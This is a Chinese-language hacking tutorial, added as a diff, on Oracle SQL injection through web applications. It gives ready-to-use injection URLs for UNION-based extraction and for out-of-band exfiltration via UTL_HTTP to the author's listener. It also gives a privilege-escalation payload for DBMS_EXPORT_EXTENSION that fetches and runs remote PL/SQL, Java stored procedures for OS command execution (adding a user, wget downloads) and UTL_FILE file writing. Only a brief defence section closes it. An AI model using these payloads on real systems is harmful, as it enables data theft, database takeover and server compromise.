@@ -1,0 +1,201 @@
+Oracle web环境注射技术
+#
+#BY    剑心
+#http://www.loveshell.net
+#
+
+前言
+
+本人不是一个专业的数据库管理员，也不是一个专门研究oracle安全的研究员，文中的语句很多都写得非常不专业，对数据库理解也不够，甚至很多语句可能 在不同版本上并不适合，一些技术也是牛人们很早提到过的，本文只是从一个web安全的角度来看如何入侵一台被防火墙防护的Oracle数据库，对一些入侵 技术做了web入侵上的总结和延伸，尽量将原理讲得明白。本文也并没有对sql注射中存在的一些共性进行讨论 ，如利用substr函数和经典注射这些，而是站在oracle数据库的角度，尽量展现一些Sql注射入侵的思路以及如何利用数据库的一些特性，在web 上做最大的入侵。一些牛人的工具也即将发布出来，希望还有人喜欢手工优美的注射。
+
+一    Oracle 简单介绍
+
+Oracle作为一款比较早期出现的RDBMS数据库，市场占有率比较大，经常用在一些大型数据库上。它本身除了很好地支持各种SQL语句外，还提供了各 种丰富的包，存储过程，甚至支持java和创建library等特性，如此强大的功能为Hacking提供了很好的便利。
+
+Oracle自身有很多默认的帐户，并且有很多的存储过程，这些存储过程是由系统建立的，很多默认都是对public开放的，在过去的几年里公布了很多 oracle的漏洞，包括溢出和SQL注射在内的许多漏洞。在这里面，SQL注射漏洞显得格外严重，因为在Oracle里，在不加其他关键字AUTHID CURRENT_USER的情况下，创建的存储过程在运行时是以创建者身份运行的，而public对这些存储过程都有权限调用，所以一旦自带存储过程存在 注射的话，很容易让普通用户提升到Oracle系统权限。Oracle本身内置了很多的帐户，其中一些帐户都有默认的密码并且具有CONNECT的权限， 这样如果oralce的端口没有受到防火墙的保护又可以被人远程连接的话，就可以被人利用默认帐户远程登陆进系统然后利用系统里的存储过程的SQL注射漏 洞，系统就会沦陷，当然，登陆进oracle还需要sid，不过这也并不困难，oracle的tnslintener默认没有设置密码，完全可以用 tnscmd.pl用services命令查出系统的sid（到比较新的版本，这个漏洞已经被修复了），这也是非常经典的入侵oracle的方式。
+
+二    Oracle Web Hacking 技术背景
+
+oracle丰富的系统表。oracle几乎所有的信息都存储系统表里，当前数据库运行的状态，当前用户的信息，当前数据库的信息，用户所能访问 的数据库和表的信息……系统表就是整个数据库的核心部分，通过恰当地查询需要的系统表，几乎可以获得所有的信息。如sys.v_$option就 包含了当前数据库的一些信息，如是否支持java等，all_tables里就包含了所有的表信息，all_tab_colmuns包含所有的列信息等 等，为我们获得信息提供了非常大的便利，后面将有关于如何利用系统表获取敏感信息的描述。
+
+在oracle的各种漏洞里，需要特别说下存储过程的注射，其实也并没有什么神秘，存储过程和函数一样是接受用户的输入然后送到数据库服务器解析执行，如 果是采取的组装成SQL字符串的形式执行的话，就很容易将数据和命令混淆，导致SQL注射。但是根据注射发生的点不同，一样地注射漏洞的性质也不同。 Oracle使用的是PL/SQL，漏洞发生在select等DML语句的，因为不支持多语句的执行，所以如果想运行自己的语句如GRANT DBA TO LOVEHSELL这些DDL语句的话，就必须创建自己的函数或存储过程，如果没有这相关的权限还可以利用cursor注射，用dbms_sql包来饶过 限制。大多数的注射正是上面这些有限制的注射，必须依靠自己创建的一些其他包或者cursor来实现提升权限的目的，但是还是有些非常少见但是注射环境非 常宽松的漏洞，就是用户的输入被放在begin和end之间的匿名pl/sql块的注射，这种环境下的注射可以直接注射进多语句，几乎没有任何限制，而可 以看到，正是这种闪光的漏洞为我们的web注射技术带来了怎样的辉煌。
+
+好了，上面谈到的都是Oracle的一些攻击技术，但是现在很多的环境是，对外开放web服务，后台数据库被防火墙保护着，无法得到数据库的太多详细信 息，已经不能直接登陆进数据库进行操作，这个时候就要考虑利用web下的漏洞来攻击后台的数据库了。现在来看下如何进行Oracle web环境下注射吧！oracle可以在各种web环境下良好地工作，各种web环境对我们注射的影响也并不是很大，在asp，.net，jsp中对进入 的参数基本没做任何过滤，但是由于.net，jsp语言是强类型语言，在数字类型的注射上即使sql语句没有做过滤但是可能在接受参数的时候就出错了，所 以注射出现在字符串类型的参数上比较多一些。在php环境下，所有的’会被转义为\’，在oracle环境里\’并不会成为转义（在oracle环境里的 正确转义应该为”），但是在我们自己的注射语句里使用’会因为被转成\’而遭到破坏，所以在注射时不能使用’。除此之外，web环境下就没什么限制了。 在数据库方面，如果语句采取的是参数的方式执行，也不能够被注射，除非使用的是字符串连接的方式（由于字符串连接的方式比较简单，也因为一些历史上的原 因，很多程序员往往会偏向于这种方式，），字符串连接方式的话也会分为两种，参数在select，update，insert这些DML语句之间，与参数 在pl/sql匿名块之间，如果web程序没有捕获错误，那么我们很容易根据错误判断出当前语句的类型，后面会提到。在pl/sql匿名块之间的比较少 见，但也不排除，这样的注射基本也是没有什么限制的，可以执行多语句，做任何事，跟本地登陆没有任何区别。
+
+三    Oracle Web Hacking 基本思路
+
+下面说说如何确定目标，注射参数的确定就由大家自己来了，主要是如何判断数据库属于oracle，根据数据库的特性很容易判断出来，oracle支持– 类型注释，但是不支持;分隔执行多语句，oracle有很多系统表，譬如all_tables，通过对这些表的访问也可以判断出是否属于oracle，另 外在oracle里的一些函数也可以用来判断，譬如utl_http.request这些，语言上的小细节也可以用来区分系统，譬如在oracle里|| 是连接符号，但是在其他数据库里就不是了，所以 and chr(123)||chr(123)=chr(123)||chr(123)这样的，如果可以顺利执行，那么就基本应该是oracle了，另外，一些脚 本在出现数据库查询错误时，对错误信息没有处理，也会泄露真实的后台数据库，这个可以很明显地看出来。
+
+然后需要确定的是注射点的类型，一般的情况下，我们进入的参数不是数字类型就基本是字符类型（其他很多人所说的搜索型注射其实还是应该归结于字符类型 的），对于数字类型的基本不用考虑什么，很容易添加–注释字符就可以让语句正确闭合了，如果是字符类型的就要考虑如何让整个语句正确，通常是添加’以及 –这些注射字符来构造自己的注射环境。在一些复杂的情况下，如同一个参数在多个sql语句和逻辑里出现，就要自己小心构造出符合环境的注射语句了，记 住，我们只需要一个能便利插入自己sql命令的完好环境：）
+
+在确定目标数据库为Oracle并且可以注射的时候，就可以开始尝试构造语句了。一般首先要进行的是判断当前的权限，在Oracle数据库里权限比较高的 是DBA权限，拥有Oracle数据库的所有权限，另外如果当前用户的权限授予不对的话，也可以实现跨库查询的效果，可以通过对dba_tables这样 的dba的表进行尝试访问来测试是否是dba。在一般的注射中，分为select类型注射，insert类型注射以及update类型等。update和 insert类型的注射可以根据上下文来更改数据库中的数据，如利用update注射将表中某个重要字段更改成我们想要的值，即使这些数据库无关紧要也没 关系，我们可以利用select子语句来将我们需要的数据查询出来然后在另外某个地方将这个数据读出来，只要遵循数据库的语法，实现自己的目的就可以了。 在这里主要说下select类型的注射，如果我们能控制select语句的一部分的话，就可能实现这种类型注射，如果查询的结果可以返回到页面中的时候， 还可以尝试使用union查询出结果，直接将内容显示在页面当中，这是最方便的一种。事实上后面可以看到，无论是什么注射，在oracle的web环境 下，都可以直接执行系统命令返回shell。
+
+Oracle中获得敏感数据，首先就是oracle有系统表，任何有权限获得数据都可以从这里获得，关键的系统表有 all_tables，all_objects等，都是有权限能访问的，包括别人赋予你权限的，所以如果你的权限是dba的话，这能看到系统中所有的表， 注射中一个技巧就是如果你需要从后台登陆但是不知道密码就可以在这里使用了，譬如猜测列名含不含有password等方法，后面的例子中也有讲述。
+
+另外比较需要了解的就是union查询，在oracle union查询中和其他数据库类似，要求列数一样，还要求类型完全一致，oracle类型有很多，常见的有字符类型，数字类型以及日期类型等等，一般我们 能用来做union查询并且显示的是字符类型，所以需要精确定位哪个字段符合我们的要求（1 会在页面显示，数据从进入到出来会有很多的流程，很多数据会在中间经过多次的处理，所以要想找到能显示出来的数据，很多时候并不是那么顺利，这种显示包括 很多地方，包括返回的http头，页面正文甚至是cookie等。    2 字符类型 因为我们出来的数据大部分都是字符类型，所以需要这个类型用来正确地匹配  3长度需要足够 尽管我们可以用一些字符函数来解决这个问题，但是够长的字段总是非常简便 ），oracle并不会自己做数据类型转换，但是oracle中提供了一个NULL类型，可以匹配所有的数据类型，所以我们在定位完字段数之后就可以在 union的各个字段填写null来匹配，另外oracle不支持select 1这样的查询，语法要求select必须有关键字，如果我们没有表可以用，可以用系统中默认谁都有权限的表dual。关于定位字段数其实也比较简单，和其 他数据库一样可以利用order by 1– 这样操作，如果字段个数存在就会正常，通常页面的逻辑会让这个参数 不只在一个地方出现，所以order by地方不一致，所以不能进行union查询。在这里可能会遇到目标语言不支持”的情况，所以可以使用chr这些函数来处理这些问题。
+
+即使不支持union，oracle的一些特性还是让我们轻易拿到想要的信息，就是用系统的utl_http.request包，这个包你可以看做是一个 普通的函数，用来取得远方web服务器的请求信息，所以我们完全可以自己监听端口，然后通过这个函数用请求将需要的数据发送过来，这个时候我们还可以用来 查看数据库可不可以上网以及出口IP，是个非常重要的一点。正是有了这些系统里丰富的包和函数以及存储过程，使得只要有一个注射点，就可以在oracle 里做任何事情，包括权限允许的和权限不允许的，记住，是任何事。
+
+敏感数据只是我们想要的一部分，通常直接杀入oracle可能更有吸引力，这个时候查看系统的信息就非常地有价值了，对注射的灵活运用也非常重要。 oracle在启动之后，把系统要用的一些变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。通常非常重要的信息有
+
+1    当前用户权限    （select * from session_roles）
+2    当前数据库版本    （select banner from sys.v_$version where rownum=1）
+3    服务器出口IP    （用utl_http.request可以实现）
+4    服务器监听IP    （select utl_inaddr.get_host_address from dual）
+5    服务器操作系统    （select member from v$logfile where rownum=1）
+6    服务器sid    (远程连接的话需要，select   instance_name   from   v$instance;）
+7    当前连接用户    （select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual）
+……
+
+知道上面这些之后就可以大致清楚服务器是在外网还是内网，支不支持远程连接，如果支持远程连接就可以尝试用默认的密码和刚得到的sid登陆了，在获得本地的权限之后，就可以尝试利用众多的包里面存在的注射提升权限了，在http://www.milw0rm.com/搜索oracle关键字可以找到很多这样的漏洞。
+
+如果是远程并且不允许连接的的话，我们还是可以利用包的sql注射的，我上面说可以做任何事的，可以利用一个注射点轻易获得shell。上面说到在 oracle里的包注射分好几种，这里需要的就是pl/sql块的注射，这个注射允许直接执行多语句，所以我们可以在web注射里利用这个直接以sys的 身份执行多条语句，如添加用户，创建自己的存储过程等等，几乎没有限制。但是系统的这种注射也是非常地少见，在06年被人公布过一个，也就是 SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES，具体的漏洞可以不了解，我也没有找到细节，后面 有我做的一些简单黑盒分析，对于我们也只需要知道这是系统里存在的一个存储过程的pl/sql注射，可以导致执行多语句就可以了，而且oracle的补丁 机制还不是很完善，基本上不会有管理员去patching这些，所以在我们看来就把这当作是系统提供的执行多语句的一个Hacking接口好了。如果你遇 到一个sql注射本身就是在pl/sql里的话没，那么更要恭喜你了 :)
+
+通过上面的几步基本让你可以获得你想要的东西，并且可以得到一个可以执行多语句的环境。在多语句执行的环境里，就可以利用oracle本身强大的功能，如 支持java创建外部存储过程，支持utl_file包写文件等等，很方便地利用java写一个shell或者直接利用java包返回一个系统的 shell。
+
+四    真实世界里的注射
+
+那么一个真实世界的注射应该是个什么样子呢？让我们试试如何从注射点来获得一个shell：）
+
+首先，我们找到一个可能存在注射的页面，list.jsp?username=loveshell，我们添加一个’结果出错了，通过爆出的错误知道这是一个oracle的后台数据库，如含有ORA-xxxx这样的都是oracle，然后用语句：
+
+list.jsp?username=loveshell’ and ”||’1′=’1    正常
+list.jsp?username=loveshell’ and ”||’2′=’1    返回空
+list.jsp?username=loveshell’–
+
+这样可以知道是一个oracle的字符类型的注射点，那么我们就可以用这种方式插入自己的SQL语句了
+
+list.jsp?username=loveshell’ and [我们的sql语句] –
+
+这个时候我们就可以根据自己的目标考虑后续的入侵思路了，一种是向web方向发展，通过查询数据库的信息来渗透web，一种就是直接入侵数据库，当然，最 完美的情况下是oracle和web是一台机器。先说说如何查询数据库里存储的信息吧！要想取得信息就要将信息反馈回来，一种是利用union查询，譬如 这里我们的入侵手法类似于下面：
+
+list.jsp?username=loveshell’ order by 10 —     错误，如果错误信息被反馈的话应该会出现xx coloum不存在之类的，字段数小于10
+list.jsp?username=loveshell’ order by 5 –    正常显示，字段数大于5
+……
+最后发现到order by 8的时候错误，order by 7 就正常，说明是7个字段。注意这里，一般的时候，页面的逻辑很简单，所以可以这样order by猜测，但是如果这个参数进入了2个以上sql语句，里面结果的字段数不一，就难用这种方法了，当然，如果进入2个以上Sql语句的话，估计union 查询也无法使用了，因为sql语句的前后字段数会不一，无法满足条件，后面我们将说到一种万能的获取数据的方法，这里先说比较直观的union查询。
+
+list.jsp?username=loveshell’ union select NULL,NULL,NULL,NULL,NULL,NULL,NULL from dual–    用7个NULL来匹配对应的字段不会出现字段类型不一的情况，与mysql不同，后面的select语句必须加一个存在的表，这里是 dual。
+这里正常返回，然后我们就可以继续了，寻找的用做信息反馈的字段需要满足我上面在基本思路里的几个条件。
+
+list.jsp?username=loveshell’ and 1=2 union select 1,NULL,NULL,NULL,NULL,NULL,NULL from dual–        正常
+list.jsp?username=loveshell’ and 1=2 union select 1,2,NULL,NULL,NULL,NULL,NULL from dual–        错误，第二个字段不是数字类型
+list.jsp?username=loveshell’ and 1=2 union select 1,’2′,NULL,NULL,NULL,NULL,NULL from dual–        错误，第二个字段不是字符类型
+
+这种情况是可能的，因为字段里还包括其他的如日期等类型，这种类型对于我们反馈信息没什么用，所以用NULL直接跳过。
+
+list.jsp?username=loveshell’ and 1=2 union select 1,NULL,’3′,NULL,NULL,NULL,NULL from dual–        这个时候正常了，而且在页面的对应的位置显示了，这个字段正是我们要找的。有的时候如果想看某个数字是多少怎么办呢？譬如想 看记录的条数，直接二分法是可以的，但是直接显示出来还是比较直观，譬如想看dba_tables的记录数
+
+list.jsp?username=loveshell’ and 1=2 union select 1,to_char((select count(*) from dba_tables),’0000000′),NULL,NULL,NULL,NULL,NULL from dual–
+
+当然还有其他to_系列函数，间接实现其他数据库里的自动转换。这个字段在页面显示并且也足够长，放得下我们的数据，所以我们就可以充分利用这个字段来进行查询了，譬如获得系统的版本信息可以用
+
+list.jsp?username=loveshell’ and 1=2 union select 1,(select banner from sys.v_$version where rownum=1),NULL,NULL,NULL,NULL,NULL from dual–
+
+如果不能使用union，也没有关系，只要是oracle数据库，我们一样可以把信息给返回来，不用经典查询那么悲观，首先本地用nc -l -vv -p 9999，然后就可以很简单地用
+
+list.jsp?username=loveshell’ and UTL_HTTP.request(‘http://www.loveshell.net:9999/’||(select banner from sys.v_$version where rownum=1))=1–
+
+这个时候loveshell.net的9999端口就应该返回sys.v_$version的banner了，就是数据库的版本，我们还获得了数 据库所在网络的ip，呵呵，另外还知道数据库是否允许外连等信息。这里使用子查询来获得数据，Oracle没有limit这样的语句所以可以用where rownum=1来返回第一条数据。但是如果想知道其他某一条记录怎么办呢？直接rownum=2是不行的，这里可以再次嵌套一个子查询
+
+list.jsp?username=loveshell’ and UTL_HTTP.request(‘http://www.loveshell.net:9999/’||(select data from (select rownum as limit,banner as data from sys.v_$version) where limit =2)=1–
+
+这样就可以得到第二条记录了，灵活运用可以很快取得需要的数据。
+
+其他的如后台的帐户什么的都可以这样返回来。这种数据的窃取手段适用于update和insert等等一切可以使用函数的地方：），如果不确信存不存在 UTL_HTTP包，可以用语句select count(*) from all_objects where object_name=’UTL_HTTP’来判断了，注意，在系统表里的数据是大小写敏感的，但是关键字本身是大小写不敏感的。另外某些少数主机也是 没有配置dns或者不能上网，没有配置dns的话可以通过用ip访问的方法来测试，不能上网的就要用其他方法了。
+能获取数据了，我们继续向web的后台靠拢，如果我们知道了后台的地址但是没有密码，我们就可以通过查询系统表来找找敏感字段如passwd在 哪，然后用上面的信息窃取手段给弄回来。all_tables包含了所有的表的信息，想找有包含passwd的字段在哪就可以用 all_tab_columns：
+
+list.jsp?username=loveshell’ and 1=2 union select 1,NULL,(select table_name||chr(35)||column_name from all_tab_columns where column_name like ‘%25PASS%25′ and ROWNUM=1),NULL,NULL,NULL,NULL from dual–
+
+其中的%25为%的转码，这样就能获得我们需要的敏感数据了，另外注意在oracle的系统表里数据都是大写的，所以用PASS而不是pass， 或者用函数转成小写也可以，如lower(column_name) like ‘%25pass%25′，进入web后台后可以继续通过后台的功能进行渗透了。
+刚才说的另外一种思路是直接获得系统的shell，在windows环境下，oracle是以服务的形式启动的，这样通过web注射就可以直接获 得system权限，是非常诱人的。我们来看看如何操作吧！首先当然要用到我们上面说到的系统中比较少见的pl/sql注射，另外为了说明在php环境下 对注射的处理，我们现在来假设我们的入侵环境是在php+Oracle上面，并且防火墙已经限制了对oracle端口的直接访问，如果是开放的话用网络上 的直接添加系统帐户的方法也很容易成功！
+首先是SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES这个函数的注射的一些简单解析
+
+SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,'BAR’,'DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ”DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ””CREATE USER TESTYOU IDENTIFIED BY TESTYOU ””;END;”;END;–’,'SYS’,0,’1′,0)=”
+这是我看到的原形，分析下就知道是在第三个参数存在的注射，并且是因为”没有过滤造成的，把第三个参数提取出来就是
+
+DBMS_OUTPUT”.PUT(:P1);EXECUTE IMMEDIATE ”DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ””CREATE USER TESTYOU IDENTIFIED BY TESTYOU ””;END;”;END;–
+
+可以看到DBMS_OUTPUT”.PUT(:P1);与END;–之间的所有部分都是原有漏洞注射语句的地方，里面是”是因为我们要提交进 ‘，但是外层将字符串括起来的正是’，所以需要对’进行转义，用的就是”，后面可以看到用chr函数可以避免这一点。这里我们将要提取出来用在web Hacking上，这个函数提取出来的原形就是：
+
+SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘FOO’,'BAR’,'DBMS_OUTPUT”.PUT(:P1);[多语句]END;–’,'SYS’,0,’1′,0)
+
+我们要执行多语句，并且不希望见到会被php处理的’的话就要对这个进行简单地再变形，多语句里如果出现’的话需要用”转义。
+
+SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)|| [多语 句]||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0)
+
+没有出现’，并且可以执行多语句的的部分也很明确，用在web hacking上的模式就是
+
+list.php?username=loveshell’ and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)|| [多语 句]||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0)=0–
+
+呵呵，前面第一个loveshell’不被影响是因为会被转成loveshell\’，而这个被oracle看作是loveshell\这个字符 串后面跟一个’，完全合法。这个漏洞是跟系统有关的，我们起码需要测试一下漏洞存在与否吧？也很简单，如果整个参数被处理好的话，我们在多语句里填写非法 的语句是应该正常解析才对，所以测试可不可以执行多语句就用
+
+list.php?username=loveshell’ and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)|| [一个非法的sql语句，如 chr(79)]||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0)=0–
+
+如果出错了的话就说明漏洞是存在的（我测试的主机基本都有这个漏洞:P）但是到这大家也可以看到一个非常麻烦的事情，我们的多语句里的每个字符都 转换成为chr的话整个参数将非常庞大，所以这里借用以下shellcode的概念，将我们的exploit放在另外一个地方，看我的语句吧！
+
+list.php?username=loveshell’ and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||utl_http.request(‘http://www.loveshell.net/shellcode.txt’)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0)=0–
+
+对，既然我们传的多语句只是字符串，为什么不把字符串放到远程的机器上然后用utl_http包取回来执行呢：），这里为了演示方便我并没有对http://www.loveshell.net/shellcod.txt进行chr转换，实际php环境下还是需要转换的。
+好了，到这里我们能做到的是让Oracle将我远程机器上的一个文件作为PL/SQL运行了，很好，把前面的都放开，看如何利用现在的条件返回一 个shell。查询相关的文档，知道比较通用一点返回shell的好方法是利用java外部存储过程，并且现在的除非是个人机器上，一般的都是支持 java的选项的，所以我们需要先来用java创建一个执行命令的存储过程。作为我们的shellcode需要变换一点东西，就是将必要的地方的’变成 ”，为什么要这样前面讲过了。
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED “JAVACMD” AS import java.lang.*;import java.io.*;public class JAVACMD{public static void execCommand (String command)     throws IOException {Runtime.getRuntime().exec(command);}};”;END;’;
+
+这样就创建了一个JAVACMD的java包，里面含有个函数execCommand，然后开始创建Oracle的存储过程，
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2) AS LANGUAGE JAVA NAME ””JAVACMD.execCommand (java.lang.String)””;”;END;’;
+
+这样放到我们的http://www.loveshell.net/shellcod.txt里，然后依次请求上面的那个注射的语句（使用之前请先将其中的utl_http.request(‘http://www.loveshell.net/shellcod.txt’)替换为utl_http.request(chr()….chr())的形式），就会在服务器创建存储了个javacmdproc过程了，参数是字符串，会被当作命令执行。我们执行试试
+
+将shellcode.txt内容换成
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”begin javacmdproc(””cmd.exe /c net user loveshell loveshell /add””);end;”;END;’;
+或者在linux下就是
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”begin javacmdproc(””wget http://www.loveshell.net -O /tmp/loveshell””);end;”;END;’;
+
+呵呵，有可能成功，但是也有可能出现类似于下面的情况
+
+ERROR at line 1:
+ORA-29532: Java call terminated by uncaught Java exception:
+java.security.AccessControlException: the Permission (java.io.FilePermission
+<<ALL FILES>> execute) has not been granted to LOVESHELL. The PL/SQL to grant
+this is dbms_java.grant_permission( ‘LOVESHELL’, ‘SYS:java.io.FilePermission’,
+‘<<ALL FILES>>’, ‘execute’ )
+ORA-06512: at “LOVESHELL.JAVACMDPROC”, line 0
+ORA-06512: at line 1
+
+没关系，java在oracle也是需要权限的，我们需要把相关的权限给它才可以哦！在Oracle里这样操作的
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”grant javasyspriv to loveshell;”;END;’;
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”begin exec dbms_java.grant_permission(””LOVESHELL””,””SYS:java.io.FilePermission””,””<<ALL FILES>>””,””execute””);end;”;END;’;
+
+各个服务器可能设置不一样，根据他提示要求的权限赋予给它就可以了。
+根据自己的情况将这个语句类似的语句放到shellcode.txt里执行，然后就可以顺利地执行命令了。java本身是很强大的，直接返回 shell也是可能的。当然，当数据库在本机的时候，利用系统中存在的utl_file包写一个文件也是可以的。这里提供简单的，可以作为 shellcode.txt里运行的代码
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”create or replace procedure utlwritefile(p_directory in varchar2, p_filename in varchar2, p_line in varchar2) as fd utl_file.file_type;begin    fd := utl_file.fopen(p_directory, p_filename, ””a””); utl_file.put_line(fd, p_line);    if (utl_file.is_open(fd) = true) then        utl_file.fclose(fd);    end if;end;”;END;’;
+
+这是创建能写文件的utlwritefile存储过程，注意这里的目录是oracle里的虚拟目录，不是物理目录，我们需要自己创建一个虚拟目录并且给予相关的权限
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”create or replace directory utl_dir_new as ””f:/inc/”””;END;’;
+
+这里假设需要写东西到f:/inc里，建立了个utl_dir_new的oracle目录，然后给权限
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”grant write on directory utl_dir_new to public;”;END;’;
+
+EXECUTE IMMEDIATE ‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ”begin utlwritefile(””UTL_DIR_NEW””,””1.php””,””test””);end;”;END;’;
+
+注意UTL_DIR_NEW的大小写，这里写了个test到UTL_DIR_NEW里面的1.php里。
+
+五    环境限制
+
+上面演示的是用SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES这个函数的漏洞，漏洞跟版 本有很大关系，所以上面的信息探测也比较重要。实际上，在早点的8i版本里也有类似的漏 洞，ctxsys.driload.validate_stmt(‘grant dba to scott’)这样的形式可以直接以高权限身份执行各种Oracle语句，也可以相应地用在web环境注射里。只要存在可用来执行多语句的漏洞，web注 射就有非常大的利用价值。
+
+六    关于防护
+
+首先就是尽量有好的编程习惯，避免使用字符串连接的方式来执行Sql语句，如果一定要采用字符串连接方式来执行Sql，那也对进入的参数必须做好 过滤，是数字类型的话就强制为数字，是字符串类型的就要做好过滤，从数据库等其他途径过来的数据也必须做好验证，在web app上杜绝Sql注射漏洞。另外在Oralce方面就是要做好对1521端口的防火墙过滤，避免被人直接登陆，对一些不需要的包和存储过程可以考虑删 除，对一些Sql注射漏洞也要及时做好补丁，避免数据库的沦陷。
+
+参考资料及网站
+
+1    http://www.milw0rm.com/
+2    《The_Oracle_Hacker’s_Handbook_Hacking_and_Defending_Oracle》
+3    http://blog.csdn.net/kj021320/archive/2007/08/28/1762769.aspx
+4    http://www.red-database-security.com/
+
